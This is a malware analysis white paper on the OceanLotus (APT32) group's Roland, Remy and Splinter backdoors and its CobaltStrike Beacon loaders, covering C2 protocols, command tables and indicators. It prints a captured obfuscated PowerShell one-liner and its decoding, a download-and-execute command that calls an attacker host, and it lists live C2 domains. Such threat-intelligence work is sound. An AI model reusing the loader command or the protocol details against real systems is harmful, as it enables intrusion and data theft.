The SpyRATs of OceanLotus
Malware Analysis White Paper

Introduction
During an incident response investigation in the final quarter of 2017, Cylance® incident responders and threat researchers uncovered several bespoke backdoors deployed by OceanLotus Group (a.k.a. APT32, Cobalt Kitty), as well as evidence of the threat actor using obfuscated CobaltStrike Beacon payloads to perform C2.

The threat actor routinely leveraged PowerShell within the environment, using one-liners to download/deploy malware, as well as obfuscators and reflective PE/shellcode loaders from various exploit kits (including MSFvenom, Veil, and DKMC), allowing much of the malware to operate in-memory, with no on-disk footprint.

The remote access trojans developed by OceanLotus Group (Roland, Remy, and Splinter, named after famous rodents) share subtle code similarities with “Backdoor.Win32.Denis” (Kaspersky), “WINDSHIELD” and “KOMPROGO” (FireEye). Roland was of particular interest in that it was carefully developed to mimic legitimate software DLLs developed by the victim organization.

The malware C2 protocols were largely tailored for each target, and supported a range of communication methods, from raw data over TCP sockets to HTTP/S proxying. In addition, the threat actor relied heavily upon CobaltStrike Beacon for providing malleable C2 communications.

The remaining white paper is dedicated to in-depth technical analysis of the malware, C2 protocols, TTPs, and general observations.

Components
During the investigation, the following backdoors were uncovered:

File Name Classification Details
certcredprovider.dll.mui Malware/Backdoor Roland RAT
underwears.png Malware/Backdoor Remy RAT
wpfgfx_v0300.dll Malware/Backdoor Splinter RAT
plugin.lst Malware/Infostealer CamCapture plugin
user.ico Malware/Backdoor Obfuscated CobaltStrike Beacon
img.png Malware/Backdoor Obfuscated named pipe backdoor (from CobaltStrike)
mobsync.exe Malware/Backdoor Rizzo
varies Malware/Backdoor Denis

Roland RAT
Classification Malware/Backdoor
Aliases
Size 245 KB (250,880 bytes)
Type Win32 PE (DLL)
File Name certcredprovider.dll.mui
Timestamp Thu, May 28 2009 13:54:28 UTC (spoofed)
Observed April 2017

Overview
Roland arrives as an un-obfuscated Win32 PE DLL. This particular version has been packaged to resemble a legitimate DLL, and contains a custom C2 protocol supporting a range of file, registry, process and memory operations, as well as a reverse shell, FTP file uploads, and retrieving system/user information.
Features
• Mimics legitimate DLL
• Custom C2 protocol
• 37 C2 commands

Behavior
Roland starts by creating a thread that initializes COM and dispatches to the main RAT entry-point, passing parameters supplied by the calling application via the heap:

The initial configuration supplied to the RAT is a UTF-16 encoded string, using newlines characters (“\n”) to separate values in the following format:

Hostname/IP
Port
Unused
Victim ID
Connection timeout

Note that the configuration is not bundled with the backdoor DLL, and is instead supplied as parameters by the calling application.
Next, the RAT calls the GetAddrInfoW API on the supplied hostname/IP, opens the socket, and connects to the C2 server:

At this point, the RAT will attempt to perform a handshake with the server:

After a successful handshake, the RAT will attempt to receive and process new commands issued by the C2 server in a loop:

C2
Protocol
The Roland C2 protocol is relatively simple, employing a simple handshake and a common header packet prior to all request/ response payloads:

Handshake
Request Header

Request and Parameters
Response Header

Response and Data

Checksums are loosely based on the MS-PST CRC32 algorithm, but require only the first four tables:
Def checksum(buffer, crc32=0xffffffff):
    offset = 0
    for i in range(0, len(buffer) % 4):
        crc32 =  CRC32.Offset32[(struct.unpack(“B”, buffer[offset:offset+1])[0] ^ crc32) & 0xff] ^ (crc32 >> 8)
        offset += 1
    for i in range(0, len(buffer) / 4):
        crc32 ^= struct.unpack(“I”, buffer[offset:offset + 4])[0]
        crc32 = CRC32.Offset56[crc32 & 0xff] ^ CRC32.Offset48[(crc32 >> 8) & 0xff] ^ CRC32.Offset40[(crc32 >> 16) & 0xff] ^ CRC32.Offset32[(crc32 >> 24) & 0xff]
        offset += 4
    return ~crc32 & 0xffffffff

Compression is performed using zlib (with the library containing the string “Fast decoding Code from Chris Anderson”), and can be inflated using the following code:
def decompress(data):
    “””Decompress using zlib”””
    decompress = zlib.decompressobj()
    inflated = decompress.decompress(data)
    inflated += decompress.flush()
    return inflated

Request/response data is trivially encoded using byte level XOR with a key of 0xC7.

The initial handshake occurs when the RAT starts, and comprises a 3-byte magic sent from the client to the server (the first byte is random), followed by a 64-byte victim ID. The server then responds with a 64-byte payload (sent byte-by-byte), assumed to be a session ID (this is not verified by the client):

After a successful handshake, the attacker is free to start issuing commands. A 100-byte header specifies the size of the following data, as well as the checksum. XOR encrypted command data is sent next (at least 160-bytes), containing the command ID, lengths, checksums, and any parameters:

typedef struct _C2_HEADER
{
  unsigned char Padding[20]; /* Can be null */
  unsigned long SizeOfData; /* Size of next packet (C2_REQUEST_DATA/C2_RESPONSE_DATA) */
  unsigned long ChecksumOfData; /* Checksum of next packet (C2_REQUEST_DATA/C2_RESPONSE_DATA) */
  unsigned char SessionId[64]; /* Possibly contains a copy of the session ID */
  unsigned long Magic; /* Can be null for requests, 0x005A15E9 for response */
  unsigned long Trailing; /* Can be null */
} C2_HEADER, *PC2_HEADER;

typedef struct _C2_REQUEST_DATA
{
  unsigned char Padding[132]; /* Can be null */
  unsigned long CommandId; /* eg. 0x5B (volume_info) */
  unsigned long Unused;
  unsigned long ParametersLength; /* Length of Parameters[] */
  unsigned long UnpackedParametersLength; /* If != ParametersLength then use zlib */
  unsigned long ParametersCrc; /* Checksum of Parameters[] */
  unsigned long UnpackedParametersCrc; /* Checksum of decompressed Parameters[] */
  unsigned long HeaderCrc; /* Checksum of preceding 0x9c bytes */
  unsigned char  Parameters[]; /* Parameters as UNICODE string or compressed with zlib */
} C2_REQUEST_DATA, *PC2_REQUEST_DATA;

The RAT will process the command before sending a response to the server comprising another header, followed by the response data, which contains the lengths, checksums, and response data (possibly zlib compressed):

typedef struct _C2_RESPONSE_DATA
{
  unsigned char VictimId[64];
  unsigned char SessionId[64];
  unsigned long BotVersion; /* 0x487 */
  unsigned long CommandId; /* eg. 0x5B (volume_info) */
  unsigned long ErrorCode; /* Command error code */
  unsigned long DataLength; /* Length of Data[] */
  unsigned long UnpackedDataLength; /* Unpacked length of Data[] */
  unsigned long DataCrc; /* Checksum of Parameters[] */
  unsigned long UnpackedDataCrc; /* Checksum of decompressed Data[] */
  unsigned long HeaderCrc; /* Checksum of preceding 0x9c bytes */
  unsigned char  Data[]; /* Response, compressed using zlib */
} C2_RESPONSE_DATA, *PC2_RESPONSE_DATA;

Commands
The following commands were supported by the version of Roland analyzed:

Command Code (Hex/Decimal) Parameters Description
network_info 0x000f 015 N/A Return information about all servers in the victim's domain (server name, type, version, platform ID)
unpack_decrypt_file 0x003d 061 file_path Extract files from an encrypted archive using modified version of zlib library
create_or_open_file 0x0045 069 password Create or open specified file, return the file handle
list_rar_archive 0x0055 085 path List the content of a RAR archive; return file name, modification times, size
volume_information 0x005b 091 desired_access Return information about mounted volumes (remote name, drive type, size, free space, filesystem)
reg_enum_value 0x0067 103 creation_disp Enumerate specified registry key
list_files_1 0x006f 111 share_mode List files in specified directories; return file name, size, modification times, and attributes
check_shell_link 0x0080 128 path Get path and file name of the target of specified shell link object
run_dll 0x0090 144 N/A Load a DLL and execute specified export; the parameter is a pointer to path and export name strings in the process memory

reg_enum_value 0x0067 103 regpath Enumerate specified registry key
list_files_1 0x006f 111 path_1 List files in specified directories; return file name, size, modification times, and attributes
path_n

check_shell_link 0x0080 128 link_path Get path and file name of the target of specified shell link object
run_dll 0x0090 144 memptr Load a DLL and execute specified export; the parameter is a pointer to path and export name strings in the process memory

ftp_upload 0x00aa 170 server Upload specified file to the FTP server using credentials passed as parameters
port
user
pwd
new_fname
org_fname

terminate 0x00c7 199 N/A Terminate the RAT
get_tcp_table  0x0164 356 memptr Retrieve a list of TCP connections; the parameter is a pointer to a memory buffer that will receive this information

create_process 0x0178 376 exepath Execute specified application
commandline

move_file 0x017f 383 src_path Move file from source path to the destination
dst_path

list_zip_archive 0x01b3 435 zip_path List the content of a ZIP archive; returns file name and sizes

get_system_info 0x01b8 440 N/A Retrieve system information such as user name, computer name, OS version, several special folders paths, time and time zone details, etc.

Command Code (Hex/Decimal) Parameters Description
sh_copy_file 0x01d5 469 file_to Copy files from specified list (file paths files_from separated by “\t”) to a specified path
sha512 0x01d6 470 path Calculate SHA512 of the specified file
mkdir 0x01e2 482 path Create specified directory
list_open_files 0x01e3 483 N/A List the names of all opened files, together with their handles
exec_cmd 0x01f0 496 commandline Execute shell command
list_files_2 0x0209 521 path_1 List files from specified directories recursively; return file name, size, and attributes
path_n

write_current_proc_mem  0x021c 540 memptr_baseaddr Write current process memory at memptr_size provided address with data from memory memptr_buffer pointed by the provided pointer

compress_encrypt_files 0x0230 560 archive_name Add files from specified list to an encrypted passwd archive; the archive format is customized and files_list uses zlib compression and AES encryption; max_size maximum size of a file can be specified

close_handle 0x0255 597 memptr_handle Close file; parameter contains a pointer to a valid object handle

read_current_proc_mem 0x0260 608 memptr Read current process memory
virtual_alloc 0x0262 610 base_address Allocate memory buffer in the size current process memory
allocation_type
protect

sh_delete_file 0x0284 644 fname_1 Delete specified files
…
fname_n

virtual_free 0x02bf 703 memptr Free allocated memory buffer
read_file 0x02c6 710 memptr Return content of specified file; the parameter is a pointer to memory that contains file handle and number of bytes to read

screenshot 0x0360 864 image_path Take a screenshot and merge it with specified image_size image before sending it back to the C2

write_file 0x0368 872 memptr Write specified file with specified content; the parameter is a pointer to memory that contains file handle, size, and pointer to a buffer to write

find_files_1 0x036a 874 path Find files matching specified pattern pattern in specified directory (recursive; return max_size file name, size, and attributes)

set_file_pointer 0x0372 882 memptr The parameter is a pointer to memory buffer containing parameters for SetFilePointer function (file handle, distance to move, and mode)

set_file_attr_and_time 0x03b4 948 path Set attributes and access times of specified attributes file to attacker supplied values
timestamp

Command Code (Hex/Decimal) Parameters Description
get_short_path_name 0x03c0 960 path Returns short path for provided file path
find_files_2 0x03dd 989 filename_pattern Find files matching specified pattern and return their access times; non-recursive
enum_shares 0x03df 991 server_name List names of shared resources on specified server

CamCapture Plugin
Classification Malware/Infostealer
Size 118KB (120320 bytes)
Type Win32 PE (DLL)
File Name plugin.lst
Timestamp Wed, 24 Oct 2007 04:23:10 UTC (spoofed)
Observed November 2017

Overview
This Win32 PE DLL arrives in a partially obfuscated form with its entry point obscured by garbage opcodes, useless instructions, and non-linear code flow:

It exports several functions that can possibly be invoked with the use of Roland backdoor’s run_dll command.

Most of these exports provide various screenshot and video capture functionality
Features
• 10 functioning exports and five additional “template” exports
• Main functionality is to grab desktop screenshots and record webcam video
• Use of Microsoft Media Foundation (Mf.dll) and Video For Windows (avicap32.dll)
Exported Functions
Each function, besides FDITruncateCabinet and FDICopy, takes the following arguments:
• Pointer to Unicode string with parameters in a “-INT” format (eg. for sleep_timeout and quality: “-1200 -100”)
• Pointer to memory that will receive address of the buffer with captured image stream
• Pointer to memory that will receive size of the capture buffer
The quality, show_wnd, and sleep_timeout parameters are optional and default to: 0x32, 0, 0 respectively. If show_wnd_bool is set, it will call ShowWindow in case the window is minimized.
Screenshot Grabbing Exports

Name Parameters Description
FCICreate quality Grab screenshot of desktop window
FCIAddFile quality Grab screenshot of foreground window
FCIFlushFolder hWnd, quality, show_wnd_ Grab screenshot of specified window

bool, sleep_timeout
FCIDestroy x1, y1, cx, cy, quality Grab screenshot of specified rectangle in the foreground window
FDICreate hWnd, x1, y1, cx, cy, quality, Grab screenshot of specified show_wnd, sleep_timeout rectangle in the specified window
These exports use a subset of GDI32 APIs to create a screenshot of the victim’s desktop or a specified window.

VIDEO Capture Exports
Name Parameters Description
FDIIsCabinet sleep_timeout, quality Creates a thread that will capture video using VFW - Video For Windows (avicap32.dll)
FDIDestroy sleep_timeout, quality Creates a thread that will capture video using MF - Microsoft Media Foundation (Mf.dll)
The video capture functionality is based on two different implementations, one using Video For Windows, and the other using MS Media Foundation.

Helper Exports
Name Parameters Description
FDITruncateCabinet none Return 0xE42 (possibly the plugin version)
FDICopy none Enumerate video capture drivers

Unused Exports
The following functions call nothing besides the routine that parses the parameters; they possibly constitute a template function for further functionalities not yet implemented:
• CreateCompressor – template code for function with one parameter
• SetCompressorInformation – template code for function with two parameters
• QueryCompressorInformation – template code for function with three parameters
• ResetCompressor – template code for function with four parameters
• CloseCompressor – template code for function with five parameters

Remy RAT
Classification Malware/Backdoor
Aliases WINDSHIELD (FireEye)
Size 355 KB (364,353 bytes)
Type PowerShell/Shellcode/Win32 PE (DLL)
File Name underwears.png
Timestamp Thu, August 07 2008 01:43:09 UTC (spoofed)
Observed November 2017

Overview
Arriving as an obfuscated PowerShell script built using the MSFvenom psh-reflection payload, the Remy DLL payload is ultimately unpacked, injected into memory, and executed via a Veil shellcode payload.

The Remy DLL shares code with Backdoor.Win32.Denis (Kaspersky), and appears to be related to the “WINDSHIELD” malware (described in the FireEye APT32 report).
Features
• Several PowerShell “wrappers”
• MSFvenom psh-reflection payload

• Veil powersell/shellcode_inject
• Main functionality is to download and execute next stage payloads
• Six additional C2 commands
• Proxy bypass
Deployment
Remy was downloaded and executed manually by the threat actor using a PowerShell one-liner:

Behavior
During loading, a C# source file is dropped to disk and compiled using the C# .NET compiler:

The following command line arguments are supplied to the compiler via the “.cmdline” file

/t:library /utf8output /R:”System.dll” /R:"C:\Windows\assembly\GAC_MSIL\System.Management. Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /out:"C:\Users\Analyst\ AppData\Local\Temp\ygq651ww.dll" /D:DEBUG /debug+ /optimize- /warnaserror  "C:\Users\Analyst\ AppData\Local\Temp\ygq651ww.0.cs"

Although a relatively novel technique, this does lead to the creation of multiple temporary files under the %APPDATA%\Temp folder:

The source file is relatively simple and is used to assist with importing Windows APIs:

Once active, the shellcode PE loader imports the following APIs dynamically:
• RtlMoveMemory
• RtlZeroMemory
• VirtualAlloc
• GetProcAddress
• LoadLibrary
The shellcode then allocates executable memory via VirtualAlloc, unpacks the main DLL payload, and calls its entry-point function:

The payload is ~248 KB (253,952 bytes) large, and purports to have been compiled on Thu Aug 07 01:43:07 2008. Originally named XamlDiagnostics.dll, it exports a single entry-point named DllEntry. The DllEntry routine first loads advapi32.dll, imports/calls GetUserNameW, and attempts to create the following mutex to prevent multiple instances from running:
151c9beb11b29fe869098007192d8fa7_%USERNAME%
It then loads several libraries, resolves all necessary APIs, and decrypts embedded strings. Most of the strings are encrypted with simple ADD 0x27 instruction.

The backdoor can be executed with credentials for web authentication specified as parameters via the command line:

/u <username> /p <password>

Otherwise, these credentials can be passed at build time in the form of an embedded RCDATA resource (encrypted with a hardcoded XOR key), in the following format:

Offset Description
0x00 Magic (0x02)
0x05 Username length
0x07 Password length
0x09 Username
0x09 + Username length Password

The RCDATA resource from the analyzed sample did not contain any hard-coded credentials:
Bytes ASCII Description
3B 6C 49 6C 5A 4B 6E 47 3D ;lIlZKnG= Encrypted resource content
39 6C 49 6C 5A 4B 6E 47 3D 9lIlZKnG= Embedded XOR key
02 00 00 00 00 00 00 00 00 Decrypted resource content

During the execution, the malware reads and writes from/to the following values under the HKCU\SOFTWARE\ThunderbirdEML.KD registry key:

Value Name Type Size Description
(default) REG_BINARY 32 bytes Value sent by the C2 server upon initial communication; it's needed to initiate download/execution of additional malware stages
EditFlags REG_BINARY Variable List of C2 URLs encoded with XOR 0x8A8B8C; can be set using one of the C2 commands
DisableProcessIsolation REG_BINARY 8 bytes System time, set at the time of the first C2 connection
<DWORD> REG_DWORD 4 bytes These values are queried/set by the C2 server during the process of downloading and executing additional stages

If the EditFlags registry value contains additional URLs, they will be prioritized, otherwise the malware will attempt to connect to the following hardcoded URLs:
• happy.abelleds.com
• far.ordanuy.com
• home.runnerfd.com
• dyndns.yceunca.com

The malware has the capability to detect and bypass the victim’s proxy configuration. There are two possible operation modes:
• TCP sockets, on port 61781 (default) or on port 443 (in case victim’s machine is configured to use a proxy)
• HTTP POST/GET on ports 80 or 443, with the optional use of authentication (supports Basic and Digest schemes)
C2
Protocol
Initially, the backdoor will connect to one of the C2 URLs using raw sockets and perform a simple handshake:

Send 1 byte: 0x02
Recv 1 byte: 0x03

If that fails, the backdoor will try to determine if the victim’s machine is configured to use a proxy server. In such case, the backdoor will first try to connect to the proxy and authenticate (if required):
• HTTP proxy (1) and HTTPS proxy (2) - connect to the proxy URL with the following header:

CONNECT %s:%d HTTP/1.1
Host: %s:%d
Proxy-Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36

Note: The User-Agent string first appeared in Chrome from February 2016.

The backdoor also supports Basic and Digest HTTP authentication methods. In case of Digest authentication, the backdoor will use the hardcoded string “d35efe4ba43e3803d57b4945fa3ab5dd” as the value for client nonce parameter.

• SOCKS proxy (4) - connect to the proxy server on specified port and send client connection request:

Send 10 bytes: 04 01 + c2_port + c2_ip
Recv  8 bytes: 00 5A XX XX XX XX XX XX (request granted)

• SOCKS5 proxy (5) – connect to the proxy server on specified port and send client connection request:

Send  3 bytes: 05 01 00
Recv  2 bytes: 05 00
Send 10 bytes: 05 01 00 01 + c2_port + c2_ip
Recv 10 bytes.

After a successful handshake, the backdoor will collect system information, such as the username, computer name, OS version, and details of the first active network adapter (excluding loopback), and send this information to the C2 server:
• Send 4-bytes (size of the upcoming packet)
• Send packet with system information:

Offset Size Description
0x0000 4 bytes Decompressed size
0x0004 4 bytes Compressed size
0x0008 zlib compressed system information (decompressed size 0x199 bytes)

The decompressed zlib data contains:
Offset Size (bytes) Description
0x0000 1 byte 0x03
0x0001 32 bytes Value from ThunderbirdEML.KD\(default)
0x0021 15 bytes Computer name
0x0030 16 bytes User name
0x0040 4 bytes unknown
0x0044 1 byte OS major version
0x0045 1 byte OS minor version
0x0046 1 byte Service Pack major version
0x0047 1 byte Service Pack minor version
0x0048 4 bytes Product Type
0x004C 4 bytes System time low
0x0050 4 bytes System time high
0x0054 4 bytes First byte from RCDATA resource (in this case 0x02)
0x0058 128 bytes Adapter description
0x00D8 8 bytes Adapter physical address
0x00E0 16 bytes Adapter IP addresses
0x00F0 4 bytes Zero
0x00F4 1 byte Connection mode (0x01 – raw sockets; 0x02 HTTP POST/GET)
0x00F5 1 byte Connection method (initially set to 0)
0x00F6 25 bytes Connection data in format of %s:%d (initially set to zeroes)
0x010F 138 bytes Connection data in format of %s:%s (initially set to zeroes)

The following diagram shows a request containing system information, with the compressed (green) and decompressed (red) sizes, zlib data (blue), and finally the decompressed information (pink):

Then, the malware will create three threads that are responsible for downloading and executing payloads, processing additional C2 commands and sending responses.

Once an internal event is set, the backdoor will contact the C2 server to download and execute additional stages. To do that, it will proceed as follows:
• Connect and send beacon based on the internally specified connection method
• Send 1 byte (0x06)
• Send data from the “(default)” value in the registry (32-bytes), zlib compressed
• Receive a 4-byte integer that will be used as registry value name
• Send data from that registry value (4-bytes)
• Receive 4-bytes (size of upcoming packet)
• Receive zlib compressed packet containing next stage payload
• Decompressed data format:

regval_data_len
regval_data
path_len
path
file_content_size
file_content
commandline_len
commandline

• Write file_content to path (create directories if needed)
• Create process path commandline
• Set registry value to the regval_data
• Send 4-byte response (last error code).

Commands
Besides executing additional next-stage payloads, the backdoor can process six additional commands.

The C2 command packets have the following format:
Offset Description
0x00 Unknown
0x04 Command ID
0x08 Length of parameters
0x0C Parameters

The following commands are supported:
Code Parameters Description
0 value_data Set “(default)” value in the registry (expected to be 32 bytes)
1 dword ip_address port Connect to specified IP on specified port and send a beacon; send code 0x05 + content of the “(default)” value from the registry + dword back to the original C2 server
3 application_name cmd_line Create process
6 file_name file_content Create and write file
7 data_len data Set EditFlags value in the registry
8 (none) Delete files: C:\Windows\Origin\Origin.exe, %appdata%\Origin\Origin.exe and terminates

Splinter RAT
Classification Malware/Backdoor
Aliases WINDSHIELD (FireEye)
Size 355 KB (364,353 bytes)
Type PowerShell/Shellcode/Win32 PE (DLL)
File Name underwears.png
Timestamp Thu, August 07 2008 01:43:09 UTC (spoofed)
Observed November 2017

Overview
Splinter arrives as an MSBuild project file containing a Base64 encoded PowerShell script generated using the MSFvenom psh-reflection module. As in the case of Remy, it utilizes on-the-fly C# compilation and strips off several PowerShell wrappers before the shellcode that calls the final payload is invoked. The backdoor itself is a Win32 PE EXE file and has the capability to collect information, download and execute payloads, run WMI queries, and manipulate files, processes, and registry entries.
The overall functionality of Splinter appears pretty much in line with the “KOMPROGO” malware (as described in the FireEye APT32 report).
Features
• Several PowerShell “wrappers”

• MSFvenom psh-reflection payload
• Veil powershell/shellcode_inject

• Custom C2 protocol (different from Remy and Roland)
• 38 C2 commands
• Use of LZHAM for compression of backdoor response data
Behavior
The backdoor will not attempt to communicate with the C2 if any of these network monitors are running:
• wireshark.exe (check for running process)
• NetworkMiner.exe (check for running process)
• TCPView (check for window name)

It will also constantly check for these processes and exit in the event any of these are detected.
As in the case of other backdoors used by the OceanLotus Group, the most sensitive strings, including hardcoded C2 addresses, are stack-based and obfuscated with one-byte incremental XOR:

The following URLs are hardcoded in the binary:
• rss.honoremarson[.]com (89.249.65.134, 185.244.213.28)
• repo.paigeherzog[.]com (89.249.65.134, 185.244.213.28)
• ssl.wolfgangneudorf[.]com (89.249.65.134, 185.244.213.28)
• help.angelinagerste[.]com (69.64.147.33, 185.244.213.28)
• mms.garyschulze[.]com (69.64.147.35, 91.195.240.103)
The backdoor also maintains a hardcoded list of ports to use, including 443, 1364, and 35357.
After sending an initial handshake, composed of two hardcoded values (request code and victim’s ID) buried inside pseudo-random data, the backdoor will send the contents of the “Key” value from [HKLM|HKCU]\Software\Microsoft\GameCenter\Identity. If this value is empty or doesn’t exist, the malware will send a hardcoded string instead.

The C2 server is expected to respond first with a header, that will indicate the size of upcoming packet, followed by a value that will be written by the backdoor to the same registry location. Then, the C2 communicates with the backdoor by sending a header containing command code and length of parameters, followed by a packet containing the command parameters string.
C2
Protocol
The standard C2 request/response consists of a 40-byte header packet, that includes the request code, hardcoded value (bot version or victim ID), compression indicator and length of upcoming data, and is padded with pseudo-randomly generated bytes. If the length field is not 0, the header is followed by a variable size packet containing data and optionally compressed with LZHAM algorithm.
The header of each C2 command packet additionally contains the command code, length of session ID, length of uncompressed data (optionally), and two boolean values indicating if the data is compressed and if the backdoor should compress the response.
The size of the data packet is calculated by combining the length of data with the length of session ID. The session ID value sent by the C2 is prepended to the data packet in the backdoor’s response.

Offset Length Initial Ping Subsequent Backdoor Responses C2 Request/Response
0x0000 1 byte random byte 0x02
0x0001 2 bytes hardcoded hardcoded 0x7266

0xC19A
0x0003 4 bytes zero length of data length of data
0x0007 1 byte random byte [copied from C2 request packet]
0x0008 4 bytes random dword [copied from C2 request packet]
0x000C 2 bytes random word [copied from C2 request packet]
0x000E 2 bytes bot version bot version / victim ID

/ victim ID
0x0010 1 byte random byte compressed bool compressed bool
0x0011 4 bytes zero decompressed size decompressed size
0x0015 2 bytes random word [copied from C2 request packet]
0x0017 4 bytes random dword command code command code
0x001B 1 byte random byte [copied from C2 request packet]
0x001C 4 bytes zero backdoor error code

Offset Length Initial Ping Subsequent Backdoor Responses C2 Request/Response
0x0020 1 byte random byte compressed bool compress response bool
0x0021 2 bytes random word length of session ID length of session ID
0x0023 1 byte random byte zero
0x0024 4 bytes random dword [copied from C2 request packet]

Commands
Command Code Parameters Description
0x04B604C5 Timeout value Set connection timeout
0x089BE370 - Check process token membership
0x036E7BDA - Get user name
0x2E6C900F - Get content of "Cert" value under [HKLM|HKCU] Software\Microsoft\GameCenter\Identity
0x1A18C8D2 - Get title bars of all visible windows (format: “[hWnd] - [title]”)
0x2EC5A3F2 - Get current process ID
0x0945C6BD - Get system version
0x0C963EDB - Get bot version or victim ID; returns hardcoded value
0x102800DC CSIDL value, Directory name Create directory
0x2E9E2C74 - Get system uptime in seconds
0x12173B0D - Get info about installed software from [HKLM|HKCU] \

SOFTWARE\Microsoft\Windows\CurrentVersion\
Uninstall (DisplayName, DisplayIcon, DisplayVersion)

0x133B0B08 Desired access, inherit handle, PID Kill specified process
0x043ADA05 - Get computer name
0x012E14E4 Integer value Set number of tries for socket select function
0x34DA0158 Error mode value Set error mode
0x11432FB0 Command line Create specified process and read the standard and error output through pipe
0x10EFFFEE Key, subkey, desired access, value name Delete specified registry value
0x0310A35C - Get current module filename
0x0369669B ? Get current module filename #2
0x16BAA536 Sleep timeout End current session, set sleep timeout
0x208B4194 Source CSIDL,  source filename, Copy specified file

destination CSIDL, destination file name, overwrite existing bool

Command Code Parameters Description
0x28FFE0B5 CSIDL, application name, startup flags, Create specified process

show window bool, creation flags
0x17878D60 - Get network adapters info
0x03BAEAA1 CSIDL, filename, desired access, share Read specified file

mode, creation disposition, attributes
0x22BD3A5E - Query "ID" value under [HKLM|HKCU]\Software\ Microsoft\GameCenter\Identity
0x06C1E522 ? Send hardcoded "3333330" string
0x166378C6 CSIDL, file name and export name, Load specified DLL and call specified export

unload bool, error mode
0x02E03AE7 CSIDL, file name, desired access, share Write specified file

mode, creation disposition, attributes
0x0973061D Key, subkey, desired access, Create registry key and set specified value

value name, type, data
0x02F0EC15 CSIDL, file name Delete specified file
0x0170EFEC - Query "Counter" value under [HKLM|HKCU]\ Software\Microsoft\GameCenter\Identity
0x0B349923 Flags, desired access, inherit handle Enumerate process modules (format: "[pid] - module_name")
0x070A23FA Key, subkey, desired access, value name Query specified registry value
0x2876AF0F list of socket options to set Set socket options
0x0B779642 Destination CSIDL, destination file name, Download file using WinHTTP APIs

user agent, access type, flags 1, server name, port, HTTP verb, resource name, flags 2

0x051EAD96 Source CSIDL,  source filename, destination Move file
CSIDL, destination file name, flags

0x2D882E6F Network resource, WQL query Execute WMIC query
0x1B443920 CSIDL, file names and export names, 

unload bool, error mode

Backdoor Error Codes
Code Description
0x02D2C5E1 Network monitor found
0x387827FB Socket connection error
0x04D9511C Error while receiving/parsing a command
0x05ECCA87 Error while processing a command
0x00B09E93 Error while parsing command parameters
0x00CE92B0 Error while sending response
0x04378165 Error allocating memory
0x018260B2 Generic try/catch error in C2 communication routine
0x00FB8F3D Generic try/catch error in C2 communication routine
0x059E8E59 Generic try/catch error in command processor routine
0x04E3FB5A Generic try/catch error in parameter parsing routine

CobaltStrike Beacon #1
Classification Malware/Backdoor
Aliases PowerShell/Win32 PE (DLL)
Size 279 KB (286,001 bytes)
Type user.ico
File Name November 2017
Observed November 2017

Overview
This PowerShell script unpacks a copy of Beacon from the Cobalt Strike penetration testing framework.
When launched, it tries to reach adstripstravel.com/activity over HTTP (the same host it was originally downloaded from):

Is this a modified version of Beacon or straight out-of-the-box?
The single exported function common to the Beacon DLL provides a pivot, linking a further 260 samples. Similarity between these and our payload is measured using the command line tool “tlsh”. From this, we determine 201 samples have a score of <=64 (out of 1000; i.e., very similar). BinDiff indicates the closest matching sample is 96% similar.
Comparison between the closest matching sample and our payload DLL reveals a lack of HTTP proxy support. This feature was added in Cobalt Strike 3.7. A further two unmatched functions in our pivot sample add support for file copying and moving – another feature added in Cobalt Strike 3.7.

The pivot sample also includes functions relating to process manipulation. Version 3.8 of Beacon released in May 2017, added the “ppid” command “to enable consent.exe to launch elevated processes with the non-elevated requester as the parent”.
There are no primary unmatched functions, meaning the payload DLL is an unmodified version of Beacon from Cobalt Strike 3.6 or earlier.
Deployment
The following event was observed during forensic investigations:

Windows PowerShell/PowerShell ID [600] :EventData/Data -> [0] Variable[1] Started[2] ProviderName=Variable NewProviderState=Started SequenceNumber=11 HostName=ConsoleHost HostVersion=4.0 HostId=12988b1b-e7f7-43ee-a01f-0eb01b11ea22 HostApplication=POwErshElL -nONiNtera -noL -noprOFI -EXE bYpasS -nOEXIT -w HIddEN -coMma  “ $(Set-ItEM  ‘variAble:OFS’ ‘’ )” +[striNg](( 95 -83-78-54 - 62-62 - 120-115-97 - 59 -121- 116 - 124- 115 -117- 98 - 54 - 120-115 - 98-56 -97 -115-116 -117 -122-127- 115-120-98-63 -56 -114 - 121-97- 120 - 122 -121-119 - 114- 101-98 -100-127- 120 -113 -62-49- 126-98 -98-102 -44-57 -57 -119 - 114- 101- 98-100-127 - 102-101-98 - 100-119 -96-115 - 122- 56 - 117-121-123- 57-100- 115 -101 - 121 - 99 -100 -117-115-101 -57 -127- 123 -119 - 113-115 -101-57 -127-123- 113 -56 - 102 -120- 113-49- 63- 63 ) |FoReACh {[ChaR] ( $_-bxoR 0x16  ) } )+”$( Sv ‘OFs’ ‘ ‘) “|. ((gET-VaRiabLe ‘*MdR*’).NaMe[3-11-2]-joIN’’) EngineVersion= RunspaceId= PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine=- EventData/Binary -> empty

The decoded PowerShell evaluates to:

IEX((new-objectnet.webclient).downloadstring(‘http://adstripstravel.com/user.ico’))

CobaltStrike Beacon #2
Classification Malware/Backdoor
Size 282 KB (289,385 bytes)
Type PowerShell/Shellcode
File Name img.png
Observed November 2017

Overview
This PowerShell script contains a simple shellcode backdoor operated over named pipe and appears to be a component relating to CobaltStrike Beacon’s malleable C2. Several versions of this backdoor have been observed using subtly different pipe names with the format:

\\.\pipe\status_# (where # is replaced with an integer)
Deployment
The following event was observed during forensic investigations:

